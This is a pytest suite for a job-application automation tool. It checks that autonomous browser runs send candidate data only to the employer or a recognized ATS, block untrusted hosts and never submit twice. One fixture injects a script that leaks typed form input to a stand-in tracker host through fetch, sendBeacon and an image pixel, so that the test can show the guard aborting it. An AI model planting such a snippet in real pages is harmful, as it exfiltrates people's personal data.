"""Guard mode "core" (the default): autonomous runs browse like a normal browser; only two rules are enforced.

Rule 1: candidate data goes only to the employer, a recognized ATS or a site the run reached from those.
Rule 2: nothing is sent twice (reservations, submit-click records, receipt detection).

Every page, host, employer and candidate here is fictional. Hosts under the reserved `.test` TLD are mapped to the loopback
fixture server at the browser's transport boundary (the browser itself "sends" them: `continue_` is answered from the
fixture), so nothing resolves or contacts a real site.
"""

from __future__ import annotations

import json
from urllib.parse import urljoin, urlsplit

import pytest
from apply_fakes import ScriptedPlanner, act, fast, server  # noqa: F401
from test_apply_autonomous_policy import approved, form_page, synthetic_ats  # noqa: F401

from jobhunt.apply import service, store
from jobhunt.apply.autonomous import Audience
from jobhunt.apply.types import StepPlan

CAREERS = "https://careers.example.test"
ATS = "https://exampleco.ats-fixture.test"
HOSTS = {"careers.example.test": "/site", "exampleco.ats-fixture.test": "/ats", "cdn.thirdparty.test": "/cdn",
         "tracker.thirdparty.test": "/track", "forms.untrusted.test": "/untrusted"}


@pytest.fixture
def core(server, monkeypatch, synthetic_ats):  # noqa: F811
    from patchright.async_api import Route

    settings = service.get_settings()
    monkeypatch.setattr(settings, "apply_guard_mode", "core")
    monkeypatch.setattr(settings, "apply_autonomous", True)
    original_fetch, original_continue = Route.fetch, Route.continue_

    async def loopback_fetch(route, **kwargs):
        parts = urlsplit(route.request.url)
        prefix = HOSTS.get(parts.hostname or "")
        if prefix is None:
            assert parts.hostname in {"127.0.0.1", "localhost"}, parts.hostname  # never a real host
            return await original_fetch(route, **kwargs)
        query = f"?{parts.query}" if parts.query else ""
        return await original_fetch(route, url=server.base + prefix + parts.path + query, **kwargs)

    async def loopback_continue(route, **kwargs):
        if urlsplit(route.request.url).hostname not in HOSTS:
            return await original_continue(route, **kwargs)
        response = await loopback_fetch(route, max_redirects=0, max_retries=0)  # what the network would answer the browser
        location = response.headers.get("location")
        if 300 <= response.status < 400 and location and route.request.is_navigation_request():
            # A fulfilled redirect is not followed through the route by the browser: answer it as the page that moves on.
            target = json.dumps(urljoin(route.request.url, location))
            await route.fulfill(status=200, content_type="text/html",
                                body=f"<title>Redirection</title><script>location.replace({target});</script>")
            return
        await route.fulfill(response=response)

    monkeypatch.setattr(Route, "fetch", loopback_fetch)
    monkeypatch.setattr(Route, "continue_", loopback_continue)
    return server


def entry_form(snapshot):
    if not any(field.kind == "file" for field in snapshot.fields):
        return StepPlan(page_kind="job_page", actions=[act(snapshot, "Postuler", "click", role="open_form")])
    return StepPlan(page_kind="form", actions=[
        act(snapshot, "Prénom", "fill", "first_name"),
        act(snapshot, "CV", "upload_cv", kind="file"),
        act(snapshot, "Envoyer", "click", role="submit"),
    ])


async def send(app):
    return await service.run(app.id, mode="submit", trigger="user", headless=True, planner=ScriptedPlanner(entry_form))


def modal_page(action, extra=""):
    return ('<title>Ingénieur systèmes embarqués</title><main><h1>Ingénieur systèmes embarqués</h1>'
            '<button type="button" onclick="document.getElementById(\'apply\').hidden = false">Postuler</button>'
            f'<div id="apply" hidden><form action="{action}" method="post">'
            '<label for="name">Prénom</label><input id="name" name="first_name">'
            '<label for="cv">CV</label><input id="cv" type="file" name="cv"><button>Envoyer</button></form></div></main>' + extra)


def paths(server, prefix):
    return [post["path"] for post in server.posts if post["path"].startswith(prefix)]


async def test_third_party_scripts_locale_redirect_and_in_page_modal_submit_once(core, profile, tmp_path, fast):
    core.redirects["/site/jobs/100"] = f"{CAREERS}/fr/offres/emploi-ingenieur"
    core.html["/site/fr/offres/emploi-ingenieur"] = modal_page("/fr/offres/emploi-ingenieur/postuler", extra="""
        <script src="https://cdn.thirdparty.test/lib.js"></script>
        <script>fetch('https://tracker.thirdparty.test/visit', {method: 'POST', body: 'visit'}).catch(() => {});</script>""")
    core.html["/cdn/lib.js"] = "window.__cdn = true;"
    _, app = approved(profile, tmp_path, f"{CAREERS}/jobs/100")
    result = await send(app)
    assert result.status == "submitted", (result.message, result.result.diagnostic_code)
    assert "/cdn/lib.js" in core.requests  # the third-party script was read by the browser, not aborted
    assert paths(core, "/site") == ["/site/fr/offres/emploi-ingenieur/postuler"]  # submitted exactly once
    assert b"first_name=" in core.posts_to("/site/fr/offres/emploi-ingenieur/postuler")[0]["body"]
    assert store.outstanding_attempt(app.id) is None


async def test_apply_flow_crossing_to_a_recognized_ats_submits_once(core, profile, tmp_path, fast):
    core.html["/site/jobs/100"] = (f'<title>Ingénieur</title><main><h1>Ingénieur systèmes embarqués</h1>'
                                   f'<a href="{ATS}/jobs/4567-ingenieur/apply">Postuler</a></main>')
    core.html["/ats/jobs/4567-ingenieur/apply"] = form_page("/jobs/4567-ingenieur/apply")
    _, app = approved(profile, tmp_path, f"{CAREERS}/jobs/100")
    result = await send(app)
    assert result.status == "submitted", (result.message, result.result.diagnostic_code)
    assert [post["path"] for post in core.posts] == ["/ats/jobs/4567-ingenieur/apply"]


async def test_write_to_a_tracker_after_data_entry_is_aborted_and_the_run_still_submits(core, profile, tmp_path, fast):
    core.html["/site/jobs/100"] = form_page("/jobs/100", f"""<script>
        const input = document.querySelector('#name');
        input.addEventListener('input', () => {{
          fetch('https://tracker.thirdparty.test/collect', {{method: 'POST', body: input.value}}).catch(() => {{}});
          navigator.sendBeacon('https://tracker.thirdparty.test/beacon', input.value);
          new Image().src = 'https://tracker.thirdparty.test/px?e=' + encodeURIComponent(input.value);
        }});</script>""")
    _, app = approved(profile, tmp_path, f"{CAREERS}/jobs/100")
    result = await send(app)
    assert result.status == "submitted", (result.message, result.result.diagnostic_code)
    assert not paths(core, "/track") and not [path for path in core.requests if path.startswith("/track")]
    assert paths(core, "/site") == ["/site/jobs/100"]
    assert "tracker.thirdparty.test" in result.result.dispatch_diagnostics.aborted_hosts


async def test_a_form_on_an_untrusted_host_never_receives_typed_data(core, profile, tmp_path, fast):
    core.html["/site/jobs/100"] = ('<title>Ingénieur</title><main><h1>Ingénieur systèmes embarqués</h1>'
                                   '<iframe src="https://forms.untrusted.test/apply"></iframe></main>')
    core.html["/untrusted/apply"] = form_page("/apply")
    _, app = approved(profile, tmp_path, f"{CAREERS}/jobs/100")
    result = await send(app)
    assert result.status == "blocked" and result.result.untrusted_host == "forms.untrusted.test"
    assert not core.posts and not core.sent
    assert not [path for path in core.requests if path.startswith("/untrusted") and "?" in path]
    assert store.outstanding_attempt(app.id) is None


async def test_the_same_posting_run_twice_is_not_sent_twice(core, profile, tmp_path, fast):
    core.html["/site/jobs/100"] = form_page("/jobs/100")
    _, app = approved(profile, tmp_path, f"{CAREERS}/jobs/100")
    first = await send(app)
    assert first.status == "submitted", (first.message, first.result.diagnostic_code)
    second = await send(app)
    assert second.status != "submitted"
    assert paths(core, "/site") == ["/site/jobs/100"]


async def test_a_submit_click_without_receipt_is_never_retried(core, profile, tmp_path, fast):
    core.html["/site/jobs/100"] = form_page("/jobs/100")
    core.post_pages["/site/jobs/100"] = "form.html"  # the answer is the form again: no receipt
    _, app = approved(profile, tmp_path, f"{CAREERS}/jobs/100")
    first = await send(app)
    assert first.status != "submitted"
    assert first.result.submit_clicked
    second = await send(app)
    assert second.status != "submitted"
    assert paths(core, "/site") == ["/site/jobs/100"]  # one send, whatever the outcome


def test_trusted_sites_are_the_employer_recognized_ats_and_the_navigation_chain(synthetic_ats):  # noqa: F811
    audience = Audience(f"{CAREERS}/jobs/100", (), lambda: None)
    assert audience.core is False  # the suite pins strict; the trust helpers do not depend on the mode
    assert audience.trusted(f"{CAREERS}/apply")
    registrable = Audience("https://careers.example.com/jobs/100", (), lambda: None)  # (".test" has no registrable domain)
    assert registrable.trusted("https://jobs.example.com/x") and not registrable.trusted("https://example.org/x")
    assert audience.trusted(f"{ATS}/jobs/4567")
    assert not audience.trusted("https://tracker.thirdparty.test/c") and not audience.trusted("ftp://careers.example.test/x")
    audience.extend_chain("https://hr.partner-ats.test/apply")
    assert audience.trusted("https://hr.partner-ats.test/submit")
    audience.extend_chain("https://www.linkedin.com/jobs/view/1")  # a job board is never part of the employer's flow
    assert not audience.trusted("https://www.linkedin.com/jobs/view/2")
    audience.note_value("Camille Durand")
    assert audience.carries_data("https://tracker.thirdparty.test/px?e=camille%20durand")
    assert not audience.carries_data("https://tracker.thirdparty.test/px?v=3")


def test_guard_mode_defaults_to_core_and_reads_the_environment(monkeypatch, tmp_path):
    from jobhunt import config

    monkeypatch.setenv("JOBHUNT_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.delenv("JOBHUNT_APPLY_GUARD_MODE", raising=False)
    fresh = config.get_settings.__wrapped__  # uncached: the shared settings object stays as the suite pinned it
    assert fresh().apply_guard_mode == "core"
    for value, expected in (("Strict", "strict"), ("strict", "strict"), ("core", "core"), ("anything-else", "core")):
        monkeypatch.setenv("JOBHUNT_APPLY_GUARD_MODE", value)
        assert fresh().apply_guard_mode == expected
